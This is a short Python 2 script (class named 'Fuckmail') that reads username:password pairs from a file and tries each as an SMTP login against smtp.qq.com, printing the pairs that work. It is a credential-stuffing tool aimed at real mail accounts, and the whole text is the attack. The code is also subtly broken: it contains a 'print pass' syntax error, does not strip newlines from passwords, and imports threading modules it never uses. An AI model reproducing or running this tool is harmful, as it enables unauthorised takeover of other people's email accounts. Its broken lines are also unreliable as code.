#!/usr/bin/env python
# -*- coding: gbk -*-
#导入smtplib和MIMEText
import smtplib
import pprint
from email.mime.text import MIMEText
import threading
import Queue
import time
class Fuckmail(object):

    def __init__(self, mailHost, mailUser, mailPwd):
        self.mailHost = mailHost;
        self.mailUser = mailUser;
        self.mailPwd = mailPwd;

    def run(self):
            try:
                self.send = smtplib.SMTP()
                self.send.connect(self.mailHost)
                self.result = self.send.login(self.mailUser, self.mailPwd)
                if self.result:
                    pprint.pprint('[*]--User:'+ self.mailUser + '--Pwd:'+ self.mailPwd + '---[*]---Success')
            except smtplib.SMTPException as e:
                print pass

if __name__ == '__main__':
    with open('userdict.txt', 'r') as f:
        for i in f:
            p = Fuckmail('smtp.qq.com', i.split(':')[0],i.split(':')[1])
            p.run()